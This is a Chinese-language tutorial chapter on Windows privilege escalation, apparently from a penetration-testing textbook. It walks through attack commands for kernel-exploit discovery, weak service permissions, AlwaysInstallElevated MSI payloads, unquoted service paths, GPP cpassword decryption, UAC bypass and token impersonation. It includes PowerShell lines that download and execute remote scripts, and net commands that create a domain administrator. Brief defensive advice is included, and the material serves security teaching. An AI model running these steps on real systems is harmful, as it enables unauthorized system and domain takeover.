# 【第四章】权限提升分析与防御

在Windows中，权限大概分为四种，分别是User、Administrator、System、TrustedInstaller。Administrator：管理员权限，可以利用Windows的机制将自己提升为system权限，以便操作SAM文件等；System：系统权限。可以对SAM等敏感文件进行读取，往往需要将Administrator权限提升到System权限才可以对散列值进行Dump操作。

提升权限的方式分为两类：

- 纵向提权：低权限角色获得高权限角色的权限。例如，一个webshell权限通过提权，拥有了管理员权限。
- 横向提权：获取同级别角色的权限。例如，在系统A中获取了系统B的权限

常用的提权方法有**系统内核溢出漏洞提权、数据库提权、错误的系统配置提权、组策略首选项提权、Web中间件漏洞提权、DLL劫持提权、滥用高权限令牌提权、第三方软件/服务提权**等。

**系统内核溢出漏洞提权分析及防范**

系统内核溢出漏洞提权是一种很通用的提权方法，攻击者通常可以使用该方法绕过系统中的所有安全限制。攻击者利用该漏洞的关键是目标系统没有及时安装补丁

**通过手动执行命令发现缺失补丁**

获取目标主机的一个普通用户的shell后，执行如下命令，查看目标系统上安装了那些补丁：

```
systeminfo
或
wmic qfe get caption,description,hotfixid,installedon
```

![292fe3dcf10d43c111bb3b59dc7f625f.png](image/292fe3dcf10d43c111bb3b59dc7f625f.png)

![e4066bc3487f9a575a4b590821da1468.png](image/e4066bc3487f9a575a4b590821da1468.png)

攻击中采取的利用方式通常是：寻找提权的EXP，将已安装的补丁编号与提权的EXP编号进行对比，例如KiTrap0D和KB979682、MS11\-011和KB2393802、MS11\-080和KB2592799等，然后使用没有编号的EXP进行提权。 Windows不同系统提权的漏洞和相应的补丁请见：[https://github.com/SecWiki/windows\-kernel\-exploits\#%E6%BC%8F%E6%B4%9E%E5%88%97%E8%A1%A8](https://github.com/SecWiki/windows-kernel-exploits#%E6%BC%8F%E6%B4%9E%E5%88%97%E8%A1%A8)

也可以将查询到的补丁信息，通过提权辅助网站进行对比：[https://i.hacking8.com/tiquan](https://i.hacking8.com/tiquan)

![c5d9320b8de6effac8da39c2a606e791.png](image/c5d9320b8de6effac8da39c2a606e791.png)

**利用Metasploit发现缺失补丁**

利用Metasploit中的post/gather/enum\_patches模块，可以根据漏洞编号快速找出系统中缺少的补丁（特别是拥有Metasploit模块的补丁\)

Metasploit还内置了**local\_exploit\_suggester**模块。这个模块用于快速识别系统中可能被利用的漏洞，使用方法如下：

![51a0bcd10f13589334b4e2bd4ae1b7ff.png](image/51a0bcd10f13589334b4e2bd4ae1b7ff.png)

**Windows Exploit Suggester**

[https://github.com/GDSSecurity/Windows\-Exploit\-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)

该工具可以将系统中已经安装的补丁程序与微软的漏洞数据库进行比较，并可以识别出能导致权限提升的漏洞。

首先，使用systeminfo命令获取当前系统的补丁安装情况，并将补丁信息导入patches.txt文件

```
systeminfo > patches.txt
```

![21eb1fafee5b45c336535f04dae938a4.png](image/21eb1fafee5b45c336535f04dae938a4.png)

![ea1991cddf6ce29a16f1d4dfe21297fd.png](image/ea1991cddf6ce29a16f1d4dfe21297fd.png)

然后，更新漏洞数据库。从微软官方网站自动下载安全公告数据库，下载的文件会自动在当前目录下以Excel电子表格的形式保存。

```
python2 windows-exploit-suggester.py --update
```

![6ba8a9944c59bed678b12551f5db9540.png](image/6ba8a9944c59bed678b12551f5db9540.png)

最后，运行如下命令，查看该系统是否存在可利用的提权漏洞：

```
python2 windows-exploit-suggester.py -d 2021-07-17-mssb.xls -i patches.txt
```

![f95b3e9f7a6dbe7088c5a3391db540fc.png](image/f95b3e9f7a6dbe7088c5a3391db540fc.png)

在实际的网络环境中 ，如果系统中存在漏洞，就有可能被攻击中利用。

PowerShell的Sherlock脚本

通过powershell的sherlock脚本\([https://github.com/rasta\-mouse/Sherlock](https://github.com/rasta-mouse/Sherlock)\)，可以快速查找可能用于本地权限提升的漏洞

漏洞列表：

![9c637d1930fda3001e7e253c9e2b1d47.png](image/9c637d1930fda3001e7e253c9e2b1d47.png)

在系统的shell环境中输入如下命令，调用Sherlock脚本：

```
Import-Module .\Sherlock.ps1
```

调用脚本后，可以搜索所有未安装的补丁，也可以搜索单个漏洞

```
Find-AllVulns
Find-MS14058
```

![95efb0c21a3d190f9d96bd5b0c8e4d75.png](image/95efb0c21a3d190f9d96bd5b0c8e4d75.png)

**Windows操作系统配置错误利用分析与防范**

Windows操作系统中的常见配置错误包括管理员凭据配置错误、服务配置错误、故意削弱的安全措施、用户权限过高等。

**系统服务权限配置错误**

Windows 系统服务文件在操作系统启动时加载和执行，并在后台调用可执行文件。因此，**如果一个低权限的用户对此系统服务调用的可执行文件拥有写权限，就可以将该文件替换成任意可执行文件，并随着系统服务的启动获得系统权限**。Windows 服务是以System权限运行的，因此，其文件、文件夹和注册表键值都是受强访问控制机制保护的。但是，在某些情况下，操作系统中仍然存在一些没有得到有效保护的服务。

该漏洞利用有以下两种情况：

i,  服务未运行：攻击者会使用任意服务直接替换原来的服务，然后重启服务。

ii, 服务正在运行且无法终止：这种情况符合绝大多数漏洞利用的场景，攻击者通常会利用**DLL劫持技术**并尝试重启服务来提权。

- PowerUp下的实战利用

       PowerUp提供了一些本地提权脚本，可以通过很多实用的脚本来寻找目标机器中的Windows服务漏洞\(也是powershell empire和powersploit的一部分\)

       下载：[https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp)

       该脚本的AllChecks模块会检测目标主机存的Windows服务漏洞，然后通过直接替换可执行文件本身来实现权限的提升。

       Allchecks模块的通常应用对象如下：

```
* 没有被引号引起来的服务的路径。
* 服务的可执行文件的权限设置不当
* Unattend.xml文件
* 注册表键AlwaysInstallElevated
```

       将该脚本远程下载或本地导入后，执行Invoke\-AllChecks命令进行漏洞检测

```
powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"
```

```
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks"
```

![faa61d6958b186d9a44ae30e0997421b.png](image/faa61d6958b186d9a44ae30e0997421b.png)

可以看出，PowerUp列出来可能存在问题的所有服务，并在AbuseFunction部分直接给出了利用方法。

在这里，检测出存在aspnet\_state服务漏洞，Path值为该服务的可执行程序的路径。我们使用AbuseFunction部分给出的操作方式，利用Install\-ServiceBinary模块，通过Write\-ServiceBinary编写一个C\#服务来添加用户。执行如下命令：

```
powershell -nop -exec bypass IEX (New-Object Net-WebClient).DownloadString('c:/PowerUp.ps1');Install-ServiceBinary -ServiceName 'aspnet_state' -UserName yokan -Password yokan11
```

重启系统，该服务将停止运行并自动添加用户。

- Metasploit下的实战利用

       在metasploit上面对应的利用模块为exploit/windows/local/service\_permissions。

      ![113f2d565297ac7e64bc04eba15fe5f5.png](image/113f2d565297ac7e64bc04eba15fe5f5.png)

      如上图，该模块有两个可以设置的选项，其中如果把AGGRESSIVE选项设为“true”，则可以利用目标机器上每一个有该漏洞的服务，设为“false”则在第一次提权成功后就会停止工作。演示如下：

      ![19de1a8a61e71c3b9f0a85b479e3fbfe.png](image/19de1a8a61e71c3b9f0a85b479e3fbfe.png)

      service\_permissions模块使用两种方法来获取system权限：如果meterpreter以管理员权限运行，该模块会尝试创建并运行一个新的服务；如果当前权限不允许创建服务，该模块会判断哪些服务的文件或者文件夹的权限有问题，并允许对其进行劫持。在创建服务或者劫持已经存在的服务时，该模块会创建一个可执行程序，其文件名和安装路径都是随机的。

**注册表键AlwaysInstallElevated**

注册表键AlwaysInstallElevated是一个策略设置项。**Windows允许低权限用户以system权限运行安装文件**。如果启用此策略设置项，那么任何权限的用户都能以NT AUTHORITY\\SYSTEM权限来安装恶意的MSI\(Microsoft Windows Installer\)文件。

- PathsAlwaysInstallElevated漏洞产生的原因

       该漏洞产生的原因是用户**开启了Windows Installer特权安装功能**

      ![9ba3473c16e1ed62be4afe30465f39b8.png](image/9ba3473c16e1ed62be4afe30465f39b8.png)

      在"运行"设置框中输入"gpedit.msc"，打开组策略编辑器

```
组策略——计算机配置——管理模板——Windows组件——Windows Installer——永远以高特权进行安装：选择启用。
组策略——用户配置——管理模板——Windows组件——Windows Installer——永远以高特权进行安装：选择启用。
```

      设置完毕，会在注册表的以下两个位置自动创建键值"1"。

```
HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
HKET_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```

     

- Windows Installer 的相关知识点

       Windows Installer是Windows操作系统的组件之一，专门用来管理和配置软件服务。Windows Installer除了是一个安装程序，还用于管理软件的安装、管理软件组件的添加和删除、监视文件的还原、通过回滚进行灾难恢复等。

        Windows Installer分为客户端安装服务（Msiexec.exe）和MSI文件两部分，他们是一起工作的。Windows Installer通过Msiexec.exe来安装MSI文件中包含的程序。MSI是微软格式的安装包，一般是程序的安装软件，包含安装和卸载软件时需要使用的大量指令和数据。Msiexec.exe用于安装MSI文件，一般在运行Microsoft Update安装更新或者安装一些软件的时候使用。简单地说，双击MSI文件就会运行Msiexec.exe

- PowerUp下的实战使用

       在这里，可以使用powerup的Get\-RegistryAlwaysInstallElevated模块来检查注册表键是否被设置。如果AlwaysInstallElevated注册表键已经被设置，就意味着MSI文件是以system权限运行的。运行该模块的命令如下，"True"表示已经设置：

```
powershell -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString('C:/powerup.ps1');Get-RegAlwaysInstallElevated
```

![6fe28c903d4cddbc8b970edda852cdde.png](image/6fe28c903d4cddbc8b970edda852cdde.png)

接下来运行Write\-UserAddMSI模块，将在当前目录生成MSI文件（msi文件内包含要执行的Payload，Payload将会以System权限执行）：

```
Write-UserAddMSI
```

![a5d7b064c659ecdc45eca67aa4133fdb.png](image/a5d7b064c659ecdc45eca67aa4133fdb.png)

这时，以普通用户权限运行UserAdd.msi，就会添加一个管理员账户。执行msiexec /q /i UserAdd.msi时会弹出一个对话框，用来添加一个管理员用户：

```
msiexec /q /i UserAll.msi
```

![71bf903f2a7a4a9bd639fd830da5354d.png](image/71bf903f2a7a4a9bd639fd830da5354d.png)

msiexec常用参数：

```
/quiet：安装过程中禁止向用户发送消息
/qn：不使用GUI
/q：隐藏安装界面
/i：安装程序
```

- Metasploit下的利用

       Metasploit中相应的利用模块为exploit/windows/local/always\_install\_elevated，可以利用该模块来完成以上操作。使用该模块设置好SESSION，运行exploit后，会返回一个system权限的meterpreter。**该模块会创建一个文件名随机的MSI文件，并在提权后删除所有已经部署的文件**。

      ![fad4c165d1e2f52a1bf1c19e52e80e42.png](image/fad4c165d1e2f52a1bf1c19e52e80e42.png)

只要**禁用注册表键AlwaysInstallElevated**,就可以阻止攻击者通过MSI文件进行提权。

**可信任服务路径漏洞**

可信任服务路径\(**包括空格且没有引号的路径**\)漏洞利用了Windows文件路径解析的特性，并涉及服务路径的文件/文件夹权限（存在缺陷的服务程序利用了属于可执行文件的文件/文件夹的权限）。如果一个服务调用的可执行文件没有正确地处理所引用的完整路径名，这个漏洞就会被攻击者用来上传任意可执行文件。也就是说，**如果一个服务的可执行文件的路径没有被双引号引起来且包含括号，那么这个服务就是有漏洞的**。

该漏洞存在如下两种可能性：

i.如果路径与服务有关，就任意创建一个服务或者编译Service模板

ii.如果路径与可执行文件有关，就任意创建一个可执行文件

- Trusted Service Paths漏洞产生的原因

       因为Windows服务通常都是以system权限运行的，所以系统在解析服务所对应的文件路径中的空格时，也会以系统权限进行。

       例如，我们有一个文件路径为“C:\\Program Files\\Some Folder\\Service.exe”。那么，对于该路径中的每一个空格，Windows都会尝试寻找并执行与空格前面的名字相匹配的程序。如上面的目录为例，Windows会依次尝试确定和执行一下程序：

       C:\\Program.exe

       C:\\Program Files\\Some.exe

       C:\\Program Files\\Some Folder\\Service.exe

       因此，如果一个被"适当"命名的可执行程序被上传到受影响的目录中，服务一旦重启，该程序就会以system权限运行。

- Metasploit下的实战利用

       首先检测目标机器是否存在漏洞。使用wmic查询命令，列出目标机器中所有没有被引号引起来的服务的路径

```
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

      ![abf17fcea2b7c6c57b3347c6084c2c5a.png](image/abf17fcea2b7c6c57b3347c6084c2c5a.png)

      如上图，可以看到“whoami”和“Bunny”这两个服务对应的二进制文件路径没有引号包含起来，并且路径中包含空格。是存在该漏洞的，但在上传可执行文件进去之前，我们需要确定我们对目标文件夹是否有写入的权限。

      在这里使用Windows的内置工具icacls,依次检查C:\\Program Files、 C:\\Program Files\\Program Folder等目录的权限发现只有“C:\\Program Files\\program folder”目录有**Everyone\(OI\)\(CI\)\(F\)**：

```
icacls "C:\Program Files"
icacls "C:\Program Files\Program Folder"
```

     ![b2b7a77e75fd08e68296def16268b072.png](image/b2b7a77e75fd08e68296def16268b072.png)

```
Everyone：用户对这个文件夹有完全控制权限。也就是说，所有用户都具有修改这个文件夹的权限。
(M): 修改
(F): 完全控制
(CI): 从属容器将继承访问控制项
(OI): 从属文件将继承访问控制项

Everyone(OI)(CI)(F)的意思是，对该文件夹，用户有读、写、删除其下文件、删除其子目录的权限。
```

       确认目标机器中存在此漏洞后，把要上传的程序重命名并放置在存在此漏洞且可写的目录下，执行如下命令，尝试重启服务

```
sc stop service_name
sc start service_name
```

      我们生成一个msf马并重命名为Hello.exe上传到该“C:\\Program Files\\Program Folder”目录下，然后分别执行如下命令重启该WhoamiTest服务：

```
sc stop WhomaiTest
sc start WhomaiTest
```

      如下图完整利用过程：

      ![0009f195cbeaf24d951d6d36f79bc0c1.png](image/0009f195cbeaf24d951d6d36f79bc0c1.png)

      可知提权前为管理员权限，提权成功后我们得到一个system权限的session。

      这里要注意，**新反弹得到的meterpreter会很快就中断了，这是因为当一个进程在Windows中启动后，必须与服务控制管理进行通信，如果没有通信，服务控制管理器会认为出现了错误，进而终止这个进程。所以，我们要在终止载荷进程之前将它迁移到其他进程中，使用msf的“set AutoRunScript migrate \-f”命令即可实现自动迁移进程**：

      ![8d1103c7b4dc0220642d863226abdc2e.png](image/8d1103c7b4dc0220642d863226abdc2e.png)

      该提权方法在metasploit中对应的模块为：exploit/windows/local/unquoted\_service\_path。该模块会将可执行程序放到受影响的文件夹中， 然后将受影响的服务重启，使用如下：

    （在之前的metasploit中为exploit/windows/local/trusted\_service\_path，但在新版的metasploit中替换替换成了exploit/windows/local/unquoted\_service\_path）

```
use exploit/windows/local/unquoted_service_path
set session 1
set AutoRunScript migrate -f
exploit
```

      可信任服务路径漏洞是由开发者没有将文件路径用引号引起来导致的。将文件路径用引号引起来，就不会出现这种问题了。

**自动安装配置文件**

网络管理员在内网中给多台机器配置同一个环境时，通常不会逐台配置，而会使用脚本化批量部署的方法。在这一过程中，会使用安装配置文件。这些文件中包含所有的安装配置信息，其中的一些还可能包含本地管理员账号和密码等信息。这些文件列举如下\(可以对整个系统进行检查\)：

```
C:\sysprep.inf
C:\syspreg\sysprep.xml
C:\Windows\system32\sysprep.inf
C:\windows\system32\sysprep\sysprep.xml
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\System32\Sysprep\Unattend.xml
C:\Windows\System32\Sysprep\Panther\Unattend.xml
```

也可以执行如下命令，搜索Unattend.xml文件：

```
dir /b /s c:\Unattend.xml                                # /s：显示指定目录和所有子目录中的文件。
```

打开Unattend.xml文件，查看其中是否包含明文密码或者经过base64加密的密码：

![364180b838a049c3fbac2b625ed7e22b.png](image/364180b838a049c3fbac2b625ed7e22b.png)

-  在Metasploit中利用的相应模块为post/windows/gather/enum\_unattend。 这个模块仅仅
- PowerUp中利用的模块

```
powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('c:\powerup.ps1');Get-UnattendedInstallFile"
```

**计划任务**

可以使用如下命令查看计算机的计划任务

```
schtasks /query /fo LIST /v
```

![e8bbd90f11a59cf261b0d1735d4b15fa.png](image/e8bbd90f11a59cf261b0d1735d4b15fa.png)

AccessChk是SysInterals套件中的一个工具，用于在Windows中进行一些系统或程序的高级查询、管理和故障排除工作，下载：[http://technet.microsoft.com/ZH\-cn/sysinternals/bb664922](http://technet.microsoft.com/ZH-cn/sysinternals/bb664922)

AccessChk是微软官方提供的工具，一般不会引起杀毒软件的报警，所以经常被攻击者利用。

执行如下命令，查看指定目录的权限配置情况。**如果攻击者对以高权限运行的任务所在的目录具有写权限，就可以使用恶意程序覆盖原来的程序**。这样，在计划任务下次执行时，就会以高权限来运行恶意程序：

```
accesschk.exe -dqv "C:\Microsoft" -accepteula
```

下面介绍几个常用的AccessChk命令

当第一次执行任何sysinternals工具包里的工具时，当前用户将会看到一个最终用户许可协议弹框，我们可以添加一个额外的参数“/accepteula”去自动接受许可协议，即：

```
accesschk.exe /accepteula
```

找出某个驱动器下所有权限配置有缺陷的文件夹路径：

```
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\  
```

找出某个驱动器下所有权限配置有缺陷的文件：

```
accesschk.exe -uwqs Users c:\*.*  
accesschk.exe -uwqs "Authenticated Users" c:\*.*是在安装活动目录时自动创建的
```

**Empire内置模块**

Empire内置了PowerUp的部分模块。输入"usemodule privesc/powerup"命令，然后按"Tab"键，查看powerup的模块列表。

下面以AllChecks模块为例进行讲解

AllChecks模块用于查找系统中的漏洞。和powersploit下PowerUp中的Invoke\-AllChecks模块一样，AllChecks模块可用于执行脚本、检查系统漏洞。输入如下命令：

```
usemodule privesc/powerup/allchecks
execute
```

AllChecks模块的应用对象如下：

i，没有被引号引起来的服务的路径

ii，ACL配置错误的服务（攻击者通常通过"service\_\*"利用 它）。

iii，服务的可执行文件的权限设置不当（攻击者通常通过"service\_exec\_\*"利用它\)

iv，Unattend.xml文件

v，注册表键AlwaysInstallElevated

vi，如果有Autologon凭证，都会留在注册表中

vii，加密的web.config字符串和应用程序池的密码

viii，%PATH%.DLL的劫持机会（攻击者通常通过write\_dllhijacker利用它）

**组策略首选项提权分析及防范**

（在Windows server 2012及以后的版本中均已修复）

**组策略首选项提权简介**

**SYSVOL是活动目录里面的一个用于存储域公共文件服务器副本的共享文件夹，在域中的所有域控制器之间进行复制**。**SYSVOL文件夹**，**主要用来存放登录脚本、组策略数据及其他域控制器需要的域信息等**。SYSVOL在所有经过身份验证的域用户或者域信任用户具有读权限的活动目录的域范围内共享。整个SYSVOL目录在所有的域控制器中是自动同步和共享的，所有的域策略均存放在**C:\\Windows\\SYSVOL\\DOMAIN\\Policies\\**目录中。

在一般的域环境中，所有机器都是脚本化批量部署的，数据量通常很大。为了方便地对所有的机器进行操作，**网络管理员往往会使用域策略进行统一的配置和管理**。大多数组织在创建域环境后，会要求加入域的计算机使用域用户密码进行登录验证。为了保证本地管理员密码的安全性，这些组织的网络管理员往往会**修改本地管理员密码**。

尽管如此，安全问题依旧存在。通过组策略统一修改的密码，虽然强度有所提高，但**所有机器的本地管理员密码是相同的**。攻击者获得了一台机器的本地管理员密码，就相当于获得了整个域中所有机器的本地管理员密码。

常见的组策略首选项（Group Policy Preferences，GPP）列举如下：

i、映射驱动器（Drives.xml\)

ii、创建本地用户

iii、数据源（DataSources.xml）

iv、打印机配置（Printers.xml\)

v、创建/更新服务（Services.xml）

vi、计划任务（ScheduledTasks.xml\)

**组策略首选项提权分析**

- 创建组策略，批量修改域中机器的

       在Group Policy Management Editor中打开计算机配置界面，新建一个组策略，更新本地计算机中用户的组策略首选项密码；  （gpmc.msc）

       将Domain Computers组添加到验证组策略对象列表中。然后，将新建的组策略应用到域中所有的非域控制器中。

       域中的机器会从域控制器处获取组策略的更新信息。手动更新域中机器的组策略，输入命令”gpupdate“。

- 获取组策略的凭据

        **管理员在域中新建一个组策略批量修改域中机器的本地管理员密码后，操作系统会自动在SYSVOL共享目录中生成一个XML文件，该文件中保存了该组策略更新后的密码**。该密码使用AES\-256加密算法，安全性还是比较高的。但是，2012年微软在官方网站上公布了该密码的私钥，导致保存在XML文件中的密码的安全性大大降低。由于任何域用户和域信任的用户均可对该共享目录进行访问，这就意味着，任何用户都可以访问保存在XML文件中的密码并将其解密，从而控制域中所有使用该账号、密码的**本地管理员**计算机。

        ①手动查找cpassword

        我们可以在SYSVOL中搜索包含cpassword获取组策略的凭据。

        ![2bdfe3044d6465e738dff6c63671347c.png](image/2bdfe3044d6465e738dff6c63671347c.png)

  

       ![0d01d2f8f870ede6d84f7e566c5467a3.png](image/0d01d2f8f870ede6d84f7e566c5467a3.png)

        如上图可以看到其中的cpassword项，保存的是加密后的内容，加密方式为AES 256，虽然目前AES 256很难被攻破，但是微软选择公开了该AES 256加密的私钥，地址如下：

```
https://msdn.microsoft.com/en-us/library/cc422924.aspx
```

        加密后用户名"gpp"的密文为"LdN1Ot2OiiJSC/e\+nROCMw"

        输入如下命令，使用python脚本进行解密

```
python gpprefdecrypt.py LdN1Ot2OiiJSC/e+nROCMw
```

        ②使用powershell获取cpassword

        powersploit提供了Get\-GPPPassword.ps1脚本。将该脚本导入系统，获取组策略中的密码

```
Import-Module .\Get-GPPPassword.ps1
Get-GPPPassword
```

        ③使用Metasploit查找cpassword

        在Metasploit中，也有一个可以自动查找cpassword的后渗透模块，即post/windows/gather/credentials/gpp

        ④使用Empire查找cpassword

        在Empire下执行"usemodule privesc/gpp"命令

- 针对组策略首选项提权的防御措施

       在用于管理组策略的计算机上安装KB2962486补丁，防止新的凭据被放置在组策略首选项中。微软在2014年修复了组策略首选项提权漏洞，使用的方法就是不再将密码保存在组策略首选项中。

       此外，需要对Everyone访问权限进行设置，具体如下：

       i，设置共享文件夹SYSVOL的访问权限

       ii，将包含组策略密码的XML文件从SYSVOL目录中删除

       iii，不要把密码放在所有域用户都有权限访问的文件中

       iv，如果需要更改域中机器的本地管理员密码，建议使用LAPS

**绕过UAC提权分析及防范**

如果计算机的操作系统版本是Windows Vista或更高，在权限不够的情况下，访问系统磁盘的根目录\(例如C:\\\)、Windows目录、Program Files目录，以及读、写系统登录数据库\(Registry\)的程序等操作，都需要经过**UAC\(user account control，用户账户控制\)的认证**才能进行。

**UAC简介**

**UAC要求用户在执行可能影响计算机运行的操作或者在进行可能影响其他用户的设置之前，拥有相应的权限或者管理员密码**。UAC在操作启动前对**用户身份进行验证**，以避免恶意软件和间谍软件在未经许可的情况下在计算机上进行安装操作或者对计算机设置进行更改。

在Windows Vista及更高版本的操作系统中，微软设置了安全控制策略，分为高、中、低三个等级。高等级的进程有管理员权限；中等级的进程有普通用户权限；低等级的进程，权限是有限的，以保证系统在受到安全威胁时造成的损失最小。

需要UAC的授权才能进行的操作列举如下：

```
配置Windows Update
增加/删除账户
更高UAC的设置
安装ActigeX
安装/卸载程序
安装设备驱动程序
将文件移动/复制到Program Files或Windows目录下
查看其他用户的文件夹
```

UAC有如下四种设置要求：

```
1 始终通知。
2 仅在程序试图更改我的计算机时通知我：默认设置。当本地Windows程序要使用高级别的权限时，不会通知用户。但是当第三方程序要使用高级别的权限时，会提示本地用户。
3 仅在程序试图更改我的计算机时通知我（不降低桌面的亮度）
4 从不通知
```

**bypassuac模块**

假如通过一系列前期渗透测试，已经获得了目标机器的meterpreter shell。当前权限为普通用户权限，现在尝试获取系统的system权限。

首先，运行exploit/windows/local/bypassuac模块，获得一个新的meterpreter shell。然后执行"**getsystem**"命令。再次查看权限，发现已经绕过UAC,获得了system权限：

![6f211eef7d073b815b51d8b45ef8204d.png](image/6f211eef7d073b815b51d8b45ef8204d.png)

![66d891aa3e1b944a8f297a707c8d0be8.png](image/66d891aa3e1b944a8f297a707c8d0be8.png)

在使用bypassuac模块进行提权时，当前用户必须在管理员组中，且UAC必须为默认配置。

当bypassuac模块运行时，会在目标机器上创建多个文件，这些文件会被杀毒软件识别。但因为**exploit/windows/local/bypassuac\_injection**模块直接运行在内存的反射DLL中，所以不会接触目标机器的硬盘，从而降低了被杀毒软件检测出来的概率。

**RunAs模块**

使用exploit/windows/local/ask模块，创建一个可执行文件，目标机器会运行一个**发起提升权限请求**的程序，提示用户是否要继续运行，如果用户选择继续运行程序，就会返回一个高权限的meterpreter shell

![5791b70133562b1240cc6ba7f81f445d.png](image/5791b70133562b1240cc6ba7f81f445d.png)

输入"run"命令后，目标机器上会弹出UAC对话框。单机'是'按钮，会返回一个新的metreperter shell。然后执行"**getsystem**"命令。再次查看权限，发现已经绕过UAC,获得了system权限。

要想使用RunAs模块进行提权，当前用户必须在管理员组中或者知道管理员的密码，对UAC的设置则没有要求。在使用RunAs模块时，需要使用EXE::Custom选项创建一个可执行文件\(需进行免杀处理）

**Nishang中的Invoke\-PsUACme模块**

Invoke\-PsUACme模块使用来自UACME项目的DLL绕过UAC

执行GET\-HELP命令，查看帮助信息

```
PS> Invoke-PsUACme -Verbose ##使用sysprep方法并执行默认的payload
PS> Invoke-PsUACme -method oobe -Verbose ##使用oobe方法并执行默认的payload
PS> Invoke-PsUACme -method oobe -Payload "powershell -windowstyle hidden -e YourEncodePaylaod   ##使用-payload参数，可以自行指定要执行的payload
```

![4c8a63eb85bd793c7af79979695bc660.png](image/4c8a63eb85bd793c7af79979695bc660.png)

除此之外，可以使用\-PayloadPath参数指定payload的路径。使用\-customDll64或\-CustomDll32参数，可以自定义DLL文件。

针对绕过UAC提权的防御措施

在企业网络环境中，防止绕过UAC的最好的方式是**不让内部机器的使用者拥有本地管理员权限**，从而降低系统遭受攻击的可能性。

在家庭网络环境中，建议使用非管理员权限进行日常办公和娱乐等活动。使用本地管理员权限登录的用户，要将UAC设置为"始终通知"或删除该用户的本地管理员权限\(这样设置后，会像在Windows Vista中一样，总是弹出警告）

**令牌窃取分析及防范**

**令牌\(Token\)是指系统中的临时密钥**，相当于账户和密码，用于决定是否允许当前请求及判断当前请求是属于哪个账户的。获得了令牌，就可以在**不提供密码或其他凭证的情况下访问网络和系统资源**。令牌会持续存在于系统内部，除非操作系统重新启动。

令牌最大的特点是随机性和不可预测性。一般的攻击者或软件都无法将令牌猜测出来。访问令牌\(Access Token\)代表访问控制操作主题的系统对象。密保令牌\(Security Token\)也叫作认证令牌或硬件令牌，是一种用于实现计算机身份校验的物理设备。会话令牌\(Session Token\)是交互会话的唯一身份标识符。

伪造令牌的核心协议是**Kerberos**协议。kerberos是一种网络认证协议，其设计目标是通过密钥系统为客户机/服务器应用程序提供强大的认证服务。这里有一篇文章详细地介绍了kerberos认证流程 [Kerberos协议认证](https://blog.csdn.net/sky_jiangcheng/article/details/81070240)，这里我简单叙述一下客户端请求证书的过程：

![df9012d30ead2f03e67aab0f5208552f.png](image/df9012d30ead2f03e67aab0f5208552f.png)

i, 客户端向认证服务器发送请求，要求得到证书

ii, 认证服务器收到请求后，将包含客户端密钥的加密证书发送给客户端。该证书包含**服务器Ticket**\(由服务器密钥加密的客户机身份和一份会话密钥\)和一个临时加密密钥\(又称为会话密钥，**Session Key**\)。当然，认证服务器也会向服务器发送一份证书，使服务器能够验证登录的客户端的身份。

iii, 客户端将Ticket传送给服务器。如果服务器确认该客户端的身份，就允许它登录服务器。

客户端登陆服务器后，攻击者就能通过入侵服务器来窃取客户端的身份了。

**令牌窃取**

假设已经获得了目标机器的meterpreter shell。首先输入"use incognito"命令，然后输入"list\_tokens \-u"命令，列出可用的令牌：

![8b6294c045ff87a20bd165a3c9462cdb.png](image/8b6294c045ff87a20bd165a3c9462cdb.png)

这里有两种类型的命令：一种是Delegation Tokens\(授权令牌\)，它支持交互式登录；另一种是Impersonation Tokens\(模拟令牌\)，它支持非交互式登录。**令牌的数量取决于我们获取到的meterpreter shell的权限级别**，权限越高，获取到的令牌数量就越多。假设已经获得了一个系统管理员的授权令牌，如果攻击者可以伪造这个令牌，便可以拥有它的权限。

接下来，输入impersonate\_token YOKAN\\\\Administartor\( **注意这里要加两个斜杠，否则会操作失败的**\)，假冒Administrator用户进行渗透测试。在meterpreter shell中执行"shell"命令并输入"whoami"，假冒的令牌yokan\\administrator已经获得了管理员权限了。

![246f300ad36b513130c9a912ab1cdc27.png](image/246f300ad36b513130c9a912ab1cdc27.png)

**Rotten Potato本地提权分析**

如果目标系统中存在有效的令牌，可以通过Rotten Potato程序快速模拟用户令牌来实现权限的提升。适用于当没有Impersonate Token时的情况。

下载：[https://github.com/foxglovesec/RottenPotato.git](https://github.com/foxglovesec/RottenPotato.git)

![8b6294c045ff87a20bd165a3c9462cdb.png](image/8b6294c045ff87a20bd165a3c9462cdb.png)

执行如下命令，将rottenpotato.exe上传到目标机器中

```
upload /root/myhacking/elevate/rottenpotato.exe
execute -HC -f rottenpotato.exe
impersonate_token "NT AUTHORITY\\SYSTEM"
```

![457a72a89645ba5226dd269472c4881e.png](image/457a72a89645ba5226dd269472c4881e.png)

![9dc303dcb795e7aa8fa1125437486275.png](image/9dc303dcb795e7aa8fa1125437486275.png)

可以看到，当前权限已经是"NT AUTHORITY\\SYSTEM"了。

**添加域管理员**

假设网络中设置了域管理进程。在meterpreter会话窗口中输入"ps"命令，查看系统进程。找到域管理进程，并使用migrate命令迁移到该进程。在meterpreter控制台中输入"shell"，进入命令行界面。

![e2bba8bfda30b8d5b875bd49171c82d8.png](image/e2bba8bfda30b8d5b875bd49171c82d8.png)

![300dcd53074b104de3fee07fe7a36df3.png](image/300dcd53074b104de3fee07fe7a36df3.png)

输入如下命令，添加域用户：

```
net user shuteer xy@china110 /ad /domain
```

![3f47fb1528d6668878f48371f6ff9cbe.png](image/3f47fb1528d6668878f48371f6ff9cbe.png)

执行如下命令，把此用户添加到域管理员组中：

```
net group "domain admins" shuteer /ad /domain
```

![766be6e346a73b32e279ddda9dac9059.png](image/766be6e346a73b32e279ddda9dac9059.png)

